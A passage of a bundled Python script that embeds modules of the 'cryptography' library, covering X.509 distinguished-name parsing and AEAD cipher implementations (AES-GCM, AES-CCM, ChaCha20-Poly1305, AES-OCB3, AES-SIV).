non-UTF8 type. If it does, set it\r\n        # to that. Otherwise, UTF8!\r\n        if _type is None:\r\n            _type = _NAMEOID_DEFAULT_TYPE.get(oid, _ASN1Type.UTF8String)\r\n\r\n        if not isinstance(_type, _ASN1Type):\r\n            raise TypeError("_type must be from the _ASN1Type enum")\r\n\r\n        self._oid = oid\r\n        self._value = value\r\n        self._type = _type\r\n\r\n    @property\r\n    def oid(self) -> ObjectIdentifier:\r\n        return self._oid\r\n\r\n    @property\r\n    def value(self) -> typing.Union[str, bytes]:\r\n        return self._value\r\n\r\n    @property\r\n    def rfc4514_attribute_name(self) -> str:\r\n        """\r\n        The short attribute name (for example "CN") if available,\r\n        otherwise the OID dotted string.\r\n        """\r\n        return _NAMEOID_TO_NAME.get(self.oid, self.oid.dotted_string)\r\n\r\n    def rfc4514_string(\r\n        self, attr_name_overrides: typing.Optional[_OidNameMap] = None\r\n    ) -> str:\r\n        """\r\n        Format as RFC4514 Distinguished Name string.\r\n\r\n        Use short attribute name if available, otherwise fall back to OID\r\n        dotted string.\r\n        """\r\n        attr_name = (\r\n            attr_name_overrides.get(self.oid) if attr_name_overrides else None\r\n        )\r\n        if attr_name is None:\r\n            attr_name = self.rfc4514_attribute_name\r\n\r\n        return f"{attr_name}={_escape_dn_value(self.value)}"\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, NameAttribute):\r\n            return NotImplemented\r\n\r\n        return self.oid == other.oid and self.value == other.value\r\n\r\n    def __hash__(self) -> int:\r\n        return hash((self.oid, self.value))\r\n\r\n    def __repr__(self) -> str:\r\n        return "<NameAttribute(oid={0.oid}, value={0.value!r})>".format(self)\r\n\r\n\r\nclass RelativeDistinguishedName:\r\n    def __init__(self, attributes: typing.Iterable[NameAttribute]):\r\n        attributes = list(attributes)\r\n        if not attributes:\r\n            raise ValueError("a relative distinguished name cannot be empty")\r\n        if not all(isinstance(x, NameAttribute) for x in attributes):\r\n            raise TypeError("attributes must be an iterable of NameAttribute")\r\n\r\n        # Keep list and frozenset to preserve attribute order where it matters\r\n        self._attributes = attributes\r\n        self._attribute_set = frozenset(attributes)\r\n\r\n        if len(self._attribute_set) != len(attributes):\r\n            raise ValueError("duplicate attributes are not allowed")\r\n\r\n    def get_attributes_for_oid(\r\n        self, oid: ObjectIdentifier\r\n    ) -> typing.List[NameAttribute]:\r\n        return [i for i in self if i.oid == oid]\r\n\r\n    def rfc4514_string(\r\n        self, attr_name_overrides: typing.Optional[_OidNameMap] = None\r\n    ) -> str:\r\n        """\r\n        Format as RFC4514 Distinguished Name string.\r\n\r\n        Within each RDN, attributes are joined by \'+\', although that is rarely\r\n        used in certificates.\r\n        """\r\n        return "+".join(\r\n            attr.rfc4514_string(attr_name_overrides)\r\n            for attr in self._attributes\r\n        )\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, RelativeDistinguishedName):\r\n            return NotImplemented\r\n\r\n        return self._attribute_set == other._attribute_set\r\n\r\n    def __hash__(self) -> int:\r\n        return hash(self._attribute_set)\r\n\r\n    def __iter__(self) -> typing.Iterator[NameAttribute]:\r\n        return iter(self._attributes)\r\n\r\n    def __len__(self) -> int:\r\n        return len(self._attributes)\r\n\r\n    def __repr__(self) -> str:\r\n        return "<RelativeDistinguishedName({})>".format(self.rfc4514_string())\r\n\r\n\r\nclass Name:\r\n    @typing.overload\r\n    def __init__(self, attributes: typing.Iterable[NameAttribute]) -> None:\r\n        ...\r\n\r\n    @typing.overload\r\n    def __init__(\r\n        self, attributes: typing.Iterable[RelativeDistinguishedName]\r\n    ) -> None:\r\n        ...\r\n\r\n    def __init__(\r\n        self,\r\n        attributes: typing.Iterable[\r\n            typing.Union[NameAttribute, RelativeDistinguishedName]\r\n        ],\r\n    ) -> None:\r\n        attributes = list(attributes)\r\n        if all(isinstance(x, NameAttribute) for x in attributes):\r\n            self._attributes = [\r\n                RelativeDistinguishedName([typing.cast(NameAttribute, x)])\r\n                for x in attributes\r\n            ]\r\n        elif all(isinstance(x, RelativeDistinguishedName) for x in attributes):\r\n            self._attributes = typing.cast(\r\n                typing.List[RelativeDistinguishedName], attributes\r\n            )\r\n        else:\r\n            raise TypeError(\r\n                "attributes must be a list of NameAttribute"\r\n                " or a list RelativeDistinguishedName"\r\n            )\r\n\r\n    @classmethod\r\n    def from_rfc4514_string(cls, data: str) -> "Name":\r\n        return _RFC4514NameParser(data).parse()\r\n\r\n    def rfc4514_string(\r\n        self, attr_name_overrides: typing.Optional[_OidNameMap] = None\r\n    ) -> str:\r\n        """\r\n        Format as RFC4514 Distinguished Name string.\r\n        For example \'CN=foobar.com,O=Foo Corp,C=US\'\r\n\r\n        An X.509 name is a two-level structure: a list of sets of attributes.\r\n        Each list element is separated by \',\' and within each list element, set\r\n        elements are separated by \'+\'. The latter is almost never used in\r\n        real world certificates. According to RFC4514 section 2.1 the\r\n        RDNSequence must be reversed when converting to string representation.\r\n        """\r\n        return ",".join(\r\n            attr.rfc4514_string(attr_name_overrides)\r\n            for attr in reversed(self._attributes)\r\n        )\r\n\r\n    def get_attributes_for_oid(\r\n        self, oid: ObjectIdentifier\r\n    ) -> typing.List[NameAttribute]:\r\n        return [i for i in self if i.oid == oid]\r\n\r\n    @property\r\n    def rdns(self) -> typing.List[RelativeDistinguishedName]:\r\n        return self._attributes\r\n\r\n    def public_bytes(self, backend: typing.Any = None) -> bytes:\r\n        return rust_x509.encode_name_bytes(self)\r\n\r\n    def __eq__(self, other: object) -> bool:\r\n        if not isinstance(other, Name):\r\n            return NotImplemented\r\n\r\n        return self._attributes == other._attributes\r\n\r\n    def __hash__(self) -> int:\r\n        # TODO: this is relatively expensive, if this looks like a bottleneck\r\n        # for you, consider optimizing!\r\n        return hash(tuple(self._attributes))\r\n\r\n    def __iter__(self) -> typing.Iterator[NameAttribute]:\r\n        for rdn in self._attributes:\r\n            for ava in rdn:\r\n                yield ava\r\n\r\n    def __len__(self) -> int:\r\n        return sum(len(rdn) for rdn in self._attributes)\r\n\r\n    def __repr__(self) -> str:\r\n        rdns = ",".join(attr.rfc4514_string() for attr in self._attributes)\r\n        return "<Name({})>".format(rdns)\r\n\r\n\r\nclass _RFC4514NameParser:\r\n    _OID_RE = re.compile(r"(0|([1-9]\\d*))(\\.(0|([1-9]\\d*)))+")\r\n    _DESCR_RE = re.compile(r"[a-zA-Z][a-zA-Z\\d-]*")\r\n\r\n    _PAIR = r"\\\\([\\\\ #=\\"\\+,;<>]|[\\da-zA-Z]{2})"\r\n    _PAIR_RE = re.compile(_PAIR)\r\n    _LUTF1 = r"[\\x01-\\x1f\\x21\\x24-\\x2A\\x2D-\\x3A\\x3D\\x3F-\\x5B\\x5D-\\x7F]"\r\n    _SUTF1 = r"[\\x01-\\x21\\x23-\\x2A\\x2D-\\x3A\\x3D\\x3F-\\x5B\\x5D-\\x7F]"\r\n    _TUTF1 = r"[\\x01-\\x1F\\x21\\x23-\\x2A\\x2D-\\x3A\\x3D\\x3F-\\x5B\\x5D-\\x7F]"\r\n    _UTFMB = rf"[\\x80-{chr(sys.maxunicode)}]"\r\n    _LEADCHAR = rf"{_LUTF1}|{_UTFMB}"\r\n    _STRINGCHAR = rf"{_SUTF1}|{_UTFMB}"\r\n    _TRAILCHAR = rf"{_TUTF1}|{_UTFMB}"\r\n    _STRING_RE = re.compile(\r\n        rf"""\r\n        (\r\n            ({_LEADCHAR}|{_PAIR})\r\n            (\r\n                ({_STRINGCHAR}|{_PAIR})*\r\n                ({_TRAILCHAR}|{_PAIR})\r\n            )?\r\n        )?\r\n        """,\r\n        re.VERBOSE,\r\n    )\r\n    _HEXSTRING_RE = re.compile(r"#([\\da-zA-Z]{2})+")\r\n\r\n    def __init__(self, data: str) -> None:\r\n        self._data = data\r\n        self._idx = 0\r\n\r\n    def _has_data(self) -> bool:\r\n        return self._idx < len(self._data)\r\n\r\n    def _peek(self) -> typing.Optional[str]:\r\n        if self._has_data():\r\n            return self._data[self._idx]\r\n        return None\r\n\r\n    def _read_char(self, ch: str) -> None:\r\n        if self._peek() != ch:\r\n            raise ValueError\r\n        self._idx += 1\r\n\r\n    def _read_re(self, pat) -> str:\r\n        match = pat.match(self._data, pos=self._idx)\r\n        if match is None:\r\n            raise ValueError\r\n        val = match.group()\r\n        self._idx += len(val)\r\n        return val\r\n\r\n    def parse(self) -> Name:\r\n        rdns = [self._parse_rdn()]\r\n\r\n        while self._has_data():\r\n            self._read_char(",")\r\n            rdns.append(self._parse_rdn())\r\n\r\n        return Name(rdns)\r\n\r\n    def _parse_rdn(self) -> RelativeDistinguishedName:\r\n        nas = [self._parse_na()]\r\n        while self._peek() == "+":\r\n            self._read_char("+")\r\n            nas.append(self._parse_na())\r\n\r\n        return RelativeDistinguishedName(nas)\r\n\r\n    def _parse_na(self) -> NameAttribute:\r\n        try:\r\n            oid_value = self._read_re(self._OID_RE)\r\n        except ValueError:\r\n            name = self._read_re(self._DESCR_RE)\r\n            oid = _NAME_TO_NAMEOID.get(name)\r\n            if oid is None:\r\n                raise ValueError\r\n        else:\r\n            oid = ObjectIdentifier(oid_value)\r\n\r\n        self._read_char("=")\r\n        if self._peek() == "#":\r\n            value = self._read_re(self._HEXSTRING_RE)\r\n            value = binascii.unhexlify(value[1:]).decode()\r\n        else:\r\n            raw_value = self._read_re(self._STRING_RE)\r\n            value = _unescape_dn_value(raw_value)\r\n\r\n        return NameAttribute(oid, value)\r\n')
    __stickytape_write_module('cryptography/x509/oid.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nfrom cryptography.hazmat._oid import (\r\n    AttributeOID,\r\n    AuthorityInformationAccessOID,\r\n    CRLEntryExtensionOID,\r\n    CertificatePoliciesOID,\r\n    ExtendedKeyUsageOID,\r\n    ExtensionOID,\r\n    NameOID,\r\n    OCSPExtensionOID,\r\n    ObjectIdentifier,\r\n    SignatureAlgorithmOID,\r\n    SubjectInformationAccessOID,\r\n)\r\n\r\n\r\n__all__ = [\r\n    "AttributeOID",\r\n    "AuthorityInformationAccessOID",\r\n    "CRLEntryExtensionOID",\r\n    "CertificatePoliciesOID",\r\n    "ExtendedKeyUsageOID",\r\n    "ExtensionOID",\r\n    "NameOID",\r\n    "OCSPExtensionOID",\r\n    "ObjectIdentifier",\r\n    "SignatureAlgorithmOID",\r\n    "SubjectInformationAccessOID",\r\n]\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/aead.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import InvalidTag\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n    from cryptography.hazmat.primitives.ciphers.aead import (\r\n        AESCCM,\r\n        AESGCM,\r\n        AESOCB3,\r\n        AESSIV,\r\n        ChaCha20Poly1305,\r\n    )\r\n\r\n    _AEAD_TYPES = typing.Union[\r\n        AESCCM, AESGCM, AESOCB3, AESSIV, ChaCha20Poly1305\r\n    ]\r\n\r\n_ENCRYPT = 1\r\n_DECRYPT = 0\r\n\r\n\r\ndef _aead_cipher_name(cipher: "_AEAD_TYPES") -> bytes:\r\n    from cryptography.hazmat.primitives.ciphers.aead import (\r\n        AESCCM,\r\n        AESGCM,\r\n        AESOCB3,\r\n        AESSIV,\r\n        ChaCha20Poly1305,\r\n    )\r\n\r\n    if isinstance(cipher, ChaCha20Poly1305):\r\n        return b"chacha20-poly1305"\r\n    elif isinstance(cipher, AESCCM):\r\n        return f"aes-{len(cipher._key) * 8}-ccm".encode("ascii")\r\n    elif isinstance(cipher, AESOCB3):\r\n        return f"aes-{len(cipher._key) * 8}-ocb".encode("ascii")\r\n    elif isinstance(cipher, AESSIV):\r\n        return f"aes-{len(cipher._key) * 8 // 2}-siv".encode("ascii")\r\n    else:\r\n        assert isinstance(cipher, AESGCM)\r\n        return f"aes-{len(cipher._key) * 8}-gcm".encode("ascii")\r\n\r\n\r\ndef _evp_cipher(cipher_name: bytes, backend: "Backend"):\r\n    if cipher_name.endswith(b"-siv"):\r\n        evp_cipher = backend._lib.EVP_CIPHER_fetch(\r\n            backend._ffi.NULL,\r\n            cipher_name,\r\n            backend._ffi.NULL,\r\n        )\r\n        backend.openssl_assert(evp_cipher != backend._ffi.NULL)\r\n        evp_cipher = backend._ffi.gc(evp_cipher, backend._lib.EVP_CIPHER_free)\r\n    else:\r\n        evp_cipher = backend._lib.EVP_get_cipherbyname(cipher_name)\r\n        backend.openssl_assert(evp_cipher != backend._ffi.NULL)\r\n\r\n    return evp_cipher\r\n\r\n\r\ndef _aead_setup(\r\n    backend: "Backend",\r\n    cipher_name: bytes,\r\n    key: bytes,\r\n    nonce: bytes,\r\n    tag: typing.Optional[bytes],\r\n    tag_len: int,\r\n    operation: int,\r\n):\r\n    evp_cipher = _evp_cipher(cipher_name, backend)\r\n    ctx = backend._lib.EVP_CIPHER_CTX_new()\r\n    ctx = backend._ffi.gc(ctx, backend._lib.EVP_CIPHER_CTX_free)\r\n    res = backend._lib.EVP_CipherInit_ex(\r\n        ctx,\r\n        evp_cipher,\r\n        backend._ffi.NULL,\r\n        backend._ffi.NULL,\r\n        backend._ffi.NULL,\r\n        int(operation == _ENCRYPT),\r\n    )\r\n    backend.openssl_assert(res != 0)\r\n    res = backend._lib.EVP_CIPHER_CTX_set_key_length(ctx, len(key))\r\n    backend.openssl_assert(res != 0)\r\n    res = backend._lib.EVP_CIPHER_CTX_ctrl(\r\n        ctx,\r\n        backend._lib.EVP_CTRL_AEAD_SET_IVLEN,\r\n        len(nonce),\r\n        backend._ffi.NULL,\r\n    )\r\n    backend.openssl_assert(res != 0)\r\n    if operation == _DECRYPT:\r\n        assert tag is not None\r\n        res = backend._lib.EVP_CIPHER_CTX_ctrl(\r\n            ctx, backend._lib.EVP_CTRL_AEAD_SET_TAG, len(tag), tag\r\n        )\r\n        backend.openssl_assert(res != 0)\r\n    elif cipher_name.endswith(b"-ccm"):\r\n        res = backend._lib.EVP_CIPHER_CTX_ctrl(\r\n            ctx, backend._lib.EVP_CTRL_AEAD_SET_TAG, tag_len, backend._ffi.NULL\r\n        )\r\n        backend.openssl_assert(res != 0)\r\n\r\n    nonce_ptr = backend._ffi.from_buffer(nonce)\r\n    key_ptr = backend._ffi.from_buffer(key)\r\n    res = backend._lib.EVP_CipherInit_ex(\r\n        ctx,\r\n        backend._ffi.NULL,\r\n        backend._ffi.NULL,\r\n        key_ptr,\r\n        nonce_ptr,\r\n        int(operation == _ENCRYPT),\r\n    )\r\n    backend.openssl_assert(res != 0)\r\n    return ctx\r\n\r\n\r\ndef _set_length(backend: "Backend", ctx, data_len: int) -> None:\r\n    intptr = backend._ffi.new("int *")\r\n    res = backend._lib.EVP_CipherUpdate(\r\n        ctx, backend._ffi.NULL, intptr, backend._ffi.NULL, data_len\r\n    )\r\n    backend.openssl_assert(res != 0)\r\n\r\n\r\ndef _process_aad(backend: "Backend", ctx, associated_data: bytes) -> None:\r\n    outlen = backend._ffi.new("int *")\r\n    res = backend._lib.EVP_CipherUpdate(\r\n        ctx, backend._ffi.NULL, outlen, associated_data, len(associated_data)\r\n    )\r\n    backend.openssl_assert(res != 0)\r\n\r\n\r\ndef _process_data(backend: "Backend", ctx, data: bytes) -> bytes:\r\n    outlen = backend._ffi.new("int *")\r\n    buf = backend._ffi.new("unsigned char[]", len(data))\r\n    res = backend._lib.EVP_CipherUpdate(ctx, buf, outlen, data, len(data))\r\n    if res == 0:\r\n        # AES SIV can error here if the data is invalid on decrypt\r\n        backend._consume_errors()\r\n        raise InvalidTag\r\n    return backend._ffi.buffer(buf, outlen[0])[:]\r\n\r\n\r\ndef _encrypt(\r\n    backend: "Backend",\r\n    cipher: "_AEAD_TYPES",\r\n    nonce: bytes,\r\n    data: bytes,\r\n    associated_data: typing.List[bytes],\r\n    tag_length: int,\r\n) -> bytes:\r\n    from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESSIV\r\n\r\n    cipher_name = _aead_cipher_name(cipher)\r\n    ctx = _aead_setup(\r\n        backend, cipher_name, cipher._key, nonce, None, tag_length, _ENCRYPT\r\n    )\r\n    # CCM requires us to pass the length of the data before processing anything\r\n    # However calling this with any other AEAD results in an error\r\n    if isinstance(cipher, AESCCM):\r\n        _set_length(backend, ctx, len(data))\r\n\r\n    for ad in associated_data:\r\n        _process_aad(backend, ctx, ad)\r\n    processed_data = _process_data(backend, ctx, data)\r\n    outlen = backend._ffi.new("int *")\r\n    # All AEADs we support besides OCB are streaming so they return nothing\r\n    # in finalization. OCB can return up to (16 byte block - 1) bytes so\r\n    # we need a buffer here too.\r\n    buf = backend._ffi.new("unsigned char[]", 16)\r\n    res = backend._lib.EVP_CipherFinal_ex(ctx, buf, outlen)\r\n    backend.openssl_assert(res != 0)\r\n    processed_data += backend._ffi.buffer(buf, outlen[0])[:]\r\n    tag_buf = backend._ffi.new("unsigned char[]", tag_length)\r\n    res = backend._lib.EVP_CIPHER_CTX_ctrl(\r\n        ctx, backend._lib.EVP_CTRL_AEAD_GET_TAG, tag_length, tag_buf\r\n    )\r\n    backend.openssl_assert(res != 0)\r\n    tag = backend._ffi.buffer(tag_buf)[:]\r\n\r\n    if isinstance(cipher, AESSIV):\r\n        # RFC 5297 defines the output as IV || C, where the tag we generate is\r\n        # the "IV" and C is the ciphertext. This is the opposite of our\r\n        # other AEADs, which are Ciphertext || Tag\r\n        backend.openssl_assert(len(tag) == 16)\r\n        return tag + processed_data\r\n    else:\r\n        return processed_data + tag\r\n\r\n\r\ndef _decrypt(\r\n    backend: "Backend",\r\n    cipher: "_AEAD_TYPES",\r\n    nonce: bytes,\r\n    data: bytes,\r\n    associated_data: typing.List[bytes],\r\n    tag_length: int,\r\n) -> bytes:\r\n    from cryptography.hazmat.primitives.ciphers.aead import AESCCM, AESSIV\r\n\r\n    if len(data) < tag_length:\r\n        raise InvalidTag\r\n\r\n    if isinstance(cipher, AESSIV):\r\n        # RFC 5297 defines the output as IV || C, where the tag we generate is\r\n        # the "IV" and C is the ciphertext. This is the opposite of our\r\n        # other AEADs, which are Ciphertext || Tag\r\n        tag = data[:tag_length]\r\n        data = data[tag_length:]\r\n    else:\r\n        tag = data[-tag_length:]\r\n        data = data[:-tag_length]\r\n    cipher_name = _aead_cipher_name(cipher)\r\n    ctx = _aead_setup(\r\n        backend, cipher_name, cipher._key, nonce, tag, tag_length, _DECRYPT\r\n    )\r\n    # CCM requires us to pass the length of the data before processing anything\r\n    # However calling this with any other AEAD results in an error\r\n    if isinstance(cipher, AESCCM):\r\n        _set_length(backend, ctx, len(data))\r\n\r\n    for ad in associated_data:\r\n        _process_aad(backend, ctx, ad)\r\n    # CCM has a different error path if the tag doesn\'t match. Errors are\r\n    # raised in Update and Final is irrelevant.\r\n    if isinstance(cipher, AESCCM):\r\n        outlen = backend._ffi.new("int *")\r\n        buf = backend._ffi.new("unsigned char[]", len(data))\r\n        res = backend._lib.EVP_CipherUpdate(ctx, buf, outlen, data, len(data))\r\n        if res != 1:\r\n            backend._consume_errors()\r\n            raise InvalidTag\r\n\r\n        processed_data = backend._ffi.buffer(buf, outlen[0])[:]\r\n    else:\r\n        processed_data = _process_data(backend, ctx, data)\r\n        outlen = backend._ffi.new("int *")\r\n        # OCB can return up to 15 bytes (16 byte block - 1) in finalization\r\n        buf = backend._ffi.new("unsigned char[]", 16)\r\n        res = backend._lib.EVP_CipherFinal_ex(ctx, buf, outlen)\r\n        processed_data += backend._ffi.buffer(buf, outlen[0])[:]\r\n        if res == 0:\r\n            backend._consume_errors()\r\n            raise InvalidTag\r\n\r\n    return processed_data\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/ciphers/aead.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport os\r\nimport typing\r\n\r\nfrom cryptography import exceptions, utils\r\nfrom cryptography.hazmat.backends.openssl import aead\r\nfrom cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n\r\nclass ChaCha20Poly1305:\r\n    _MAX_SIZE = 2**31 - 1\r\n\r\n    def __init__(self, key: bytes):\r\n        if not backend.aead_cipher_supported(self):\r\n            raise exceptions.UnsupportedAlgorithm(\r\n                "ChaCha20Poly1305 is not supported by this version of OpenSSL",\r\n                exceptions._Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n        utils._check_byteslike("key", key)\r\n\r\n        if len(key) != 32:\r\n            raise ValueError("ChaCha20Poly1305 key must be 32 bytes.")\r\n\r\n        self._key = key\r\n\r\n    @classmethod\r\n    def generate_key(cls) -> bytes:\r\n        return os.urandom(32)\r\n\r\n    def encrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        if len(data) > self._MAX_SIZE or len(associated_data) > self._MAX_SIZE:\r\n            # This is OverflowError to match what cffi would raise\r\n            raise OverflowError(\r\n                "Data or associated data too long. Max 2**31 - 1 bytes"\r\n            )\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._encrypt(backend, self, nonce, data, [associated_data], 16)\r\n\r\n    def decrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._decrypt(backend, self, nonce, data, [associated_data], 16)\r\n\r\n    def _check_params(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: bytes,\r\n    ) -> None:\r\n        utils._check_byteslike("nonce", nonce)\r\n        utils._check_bytes("data", data)\r\n        utils._check_bytes("associated_data", associated_data)\r\n        if len(nonce) != 12:\r\n            raise ValueError("Nonce must be 12 bytes")\r\n\r\n\r\nclass AESCCM:\r\n    _MAX_SIZE = 2**31 - 1\r\n\r\n    def __init__(self, key: bytes, tag_length: int = 16):\r\n        utils._check_byteslike("key", key)\r\n        if len(key) not in (16, 24, 32):\r\n            raise ValueError("AESCCM key must be 128, 192, or 256 bits.")\r\n\r\n        self._key = key\r\n        if not isinstance(tag_length, int):\r\n            raise TypeError("tag_length must be an integer")\r\n\r\n        if tag_length not in (4, 6, 8, 10, 12, 14, 16):\r\n            raise ValueError("Invalid tag_length")\r\n\r\n        self._tag_length = tag_length\r\n\r\n        if not backend.aead_cipher_supported(self):\r\n            raise exceptions.UnsupportedAlgorithm(\r\n                "AESCCM is not supported by this version of OpenSSL",\r\n                exceptions._Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n\r\n    @classmethod\r\n    def generate_key(cls, bit_length: int) -> bytes:\r\n        if not isinstance(bit_length, int):\r\n            raise TypeError("bit_length must be an integer")\r\n\r\n        if bit_length not in (128, 192, 256):\r\n            raise ValueError("bit_length must be 128, 192, or 256")\r\n\r\n        return os.urandom(bit_length // 8)\r\n\r\n    def encrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        if len(data) > self._MAX_SIZE or len(associated_data) > self._MAX_SIZE:\r\n            # This is OverflowError to match what cffi would raise\r\n            raise OverflowError(\r\n                "Data or associated data too long. Max 2**31 - 1 bytes"\r\n            )\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        self._validate_lengths(nonce, len(data))\r\n        return aead._encrypt(\r\n            backend, self, nonce, data, [associated_data], self._tag_length\r\n        )\r\n\r\n    def decrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._decrypt(\r\n            backend, self, nonce, data, [associated_data], self._tag_length\r\n        )\r\n\r\n    def _validate_lengths(self, nonce: bytes, data_len: int) -> None:\r\n        # For information about computing this, see\r\n        # https://tools.ietf.org/html/rfc3610#section-2.1\r\n        l_val = 15 - len(nonce)\r\n        if 2 ** (8 * l_val) < data_len:\r\n            raise ValueError("Data too long for nonce")\r\n\r\n    def _check_params(\r\n        self, nonce: bytes, data: bytes, associated_data: bytes\r\n    ) -> None:\r\n        utils._check_byteslike("nonce", nonce)\r\n        utils._check_bytes("data", data)\r\n        utils._check_bytes("associated_data", associated_data)\r\n        if not 7 <= len(nonce) <= 13:\r\n            raise ValueError("Nonce must be between 7 and 13 bytes")\r\n\r\n\r\nclass AESGCM:\r\n    _MAX_SIZE = 2**31 - 1\r\n\r\n    def __init__(self, key: bytes):\r\n        utils._check_byteslike("key", key)\r\n        if len(key) not in (16, 24, 32):\r\n            raise ValueError("AESGCM key must be 128, 192, or 256 bits.")\r\n\r\n        self._key = key\r\n\r\n    @classmethod\r\n    def generate_key(cls, bit_length: int) -> bytes:\r\n        if not isinstance(bit_length, int):\r\n            raise TypeError("bit_length must be an integer")\r\n\r\n        if bit_length not in (128, 192, 256):\r\n            raise ValueError("bit_length must be 128, 192, or 256")\r\n\r\n        return os.urandom(bit_length // 8)\r\n\r\n    def encrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        if len(data) > self._MAX_SIZE or len(associated_data) > self._MAX_SIZE:\r\n            # This is OverflowError to match what cffi would raise\r\n            raise OverflowError(\r\n                "Data or associated data too long. Max 2**31 - 1 bytes"\r\n            )\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._encrypt(backend, self, nonce, data, [associated_data], 16)\r\n\r\n    def decrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._decrypt(backend, self, nonce, data, [associated_data], 16)\r\n\r\n    def _check_params(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: bytes,\r\n    ) -> None:\r\n        utils._check_byteslike("nonce", nonce)\r\n        utils._check_bytes("data", data)\r\n        utils._check_bytes("associated_data", associated_data)\r\n        if len(nonce) < 8 or len(nonce) > 128:\r\n            raise ValueError("Nonce must be between 8 and 128 bytes")\r\n\r\n\r\nclass AESOCB3:\r\n    _MAX_SIZE = 2**31 - 1\r\n\r\n    def __init__(self, key: bytes):\r\n        utils._check_byteslike("key", key)\r\n        if len(key) not in (16, 24, 32):\r\n            raise ValueError("AESOCB3 key must be 128, 192, or 256 bits.")\r\n\r\n        self._key = key\r\n\r\n        if not backend.aead_cipher_supported(self):\r\n            raise exceptions.UnsupportedAlgorithm(\r\n                "OCB3 is not supported by this version of OpenSSL",\r\n                exceptions._Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n\r\n    @classmethod\r\n    def generate_key(cls, bit_length: int) -> bytes:\r\n        if not isinstance(bit_length, int):\r\n            raise TypeError("bit_length must be an integer")\r\n\r\n        if bit_length not in (128, 192, 256):\r\n            raise ValueError("bit_length must be 128, 192, or 256")\r\n\r\n        return os.urandom(bit_length // 8)\r\n\r\n    def encrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        if len(data) > self._MAX_SIZE or len(associated_data) > self._MAX_SIZE:\r\n            # This is OverflowError to match what cffi would raise\r\n            raise OverflowError(\r\n                "Data or associated data too long. Max 2**31 - 1 bytes"\r\n            )\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._encrypt(backend, self, nonce, data, [associated_data], 16)\r\n\r\n    def decrypt(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: typing.Optional[bytes],\r\n    ) -> bytes:\r\n        if associated_data is None:\r\n            associated_data = b""\r\n\r\n        self._check_params(nonce, data, associated_data)\r\n        return aead._decrypt(backend, self, nonce, data, [associated_data], 16)\r\n\r\n    def _check_params(\r\n        self,\r\n        nonce: bytes,\r\n        data: bytes,\r\n        associated_data: bytes,\r\n    ) -> None:\r\n        utils._check_byteslike("nonce", nonce)\r\n        utils._check_bytes("data", data)\r\n        utils._check_bytes("associated_data", associated_data)\r\n        if len(nonce) < 12 or len(nonce) > 15:\r\n            raise ValueError("Nonce must be between 12 and 15 bytes")\r\n\r\n\r\nclass AESSIV(object):\r\n    _MAX_SIZE = 2**31 - 1\r\n\r\n    def __init__(self, key: bytes):\r\n        utils._check_byteslike("key", key)\r\n        if len(key) not in (32, 48, 64):\r\n            raise ValueError("AESSIV key must be 256, 384, or 512 bits.")\r\n\r\n        self._key = key\r\n\r\n        if not backend.aead_cipher_supported(self):\r\n            raise exceptions.UnsupportedAlgorithm(\r\n                "AES-SIV is not supported by this version of OpenSSL",\r\n                exceptions._Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n\r\n    @classmethod\r\n    def generate_key(cls, bit_length: int) -> bytes:\r\n        if not isinstance(bit_length, int):\r\n            raise TypeError("bit_length must be an integer")\r\n\r\n        if bit_length not in (256, 384, 512):\r\n            raise ValueError("bit_length must be 256, 384, or 512")\r\n\r\n        return os.urandom(bit_length // 8)\r\n\r\n    def encrypt(\r\n        self,\r\n        data: bytes,\r\n        associated_data: 